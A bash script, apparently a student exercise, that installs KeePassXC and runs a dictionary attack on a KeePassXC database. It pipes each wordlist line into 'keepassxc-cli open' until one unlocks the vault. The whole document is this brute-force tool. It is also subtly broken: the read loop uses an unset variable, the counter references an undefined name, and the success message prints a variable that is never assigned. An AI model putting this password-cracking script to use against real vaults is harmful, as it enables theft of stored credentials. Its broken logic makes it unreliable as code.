#!/bin/bash
# create a foilder
rm -rf report
mkdir $(pwd)/report
chmod 777  $(pwd)/report
# i need to check if the app keepassxc-cli if there if not i will install the app 
packs="keepassxc-cli"
if  ! sudo dpkg -s "$packs" &>>$(pwd)/report/outputterminal.txt 
then 
#he will save the time when the update start   
echo "(# update and upgarde : $(date))" 
# Checking for update and upgrade
sudo apt-get update -y &>>$(pwd)/report/outputterminal.txt
sudo apt-get dist-upgrade -y &>>$(pwd)/report/outputterminal.txt
echo ""
#he will save the time when the pc start to install  packs
echo "(# $packs is installing: $(date))" 
#start installing
sudo apt-get install "keepassxc" -y &>>$(pwd)/report/outputterminal.txt
echo ""
fi

#statement that checks whether the number of command-line arguments passed to the script is not equal to 2. / $# represents the number of command-line arguments.  / -ne is a comparison operator that stands for "not equal."
if [ $# -ne 2 ] 
then
#this command prints a usage message to the standard output. $0 represents the name of the script itself.
echo " $0 <key> <pass>"
#is command exits the script with a status code of 2, indicating an error.
  exit 2
fi 
#this command counts the number of lines in the file specified by the second command-line argument 
w=$( wc -l < $2 )
#track of the number of items tested.
t=0
#recognizes word boundaries.
IFS=''
#loop that reads input  and  the  line from the input source and assigns it to the variable
while read -r $r; do
#This line calculates the value of t by adding 1 to the current value of t.
t=$((n_tested + 1))
#echo how many passwords  tested
echo -ne "[+] Words tested: $t/$w ($r)\r"
#this coomnad burte force   he acess the app and try multibetime 
echo $r | keepassxc-cli open $1 &>>$(pwd)/report/outputterminal.txt
#Here, it checks if the exit status is equal to 0, which typically indicates success.
if [ $? -eq 0 ]
then
echo ""
#this line prints a message indicating that a password has been found  and he  exits t
echo "[*] Password found: $line"; exit 0;
 fi
# end of the while loop the $2 The loop continues iterating as long as there are lines to read from that file
done < $2
echo "  didnt found the passowrd"; exit 3;
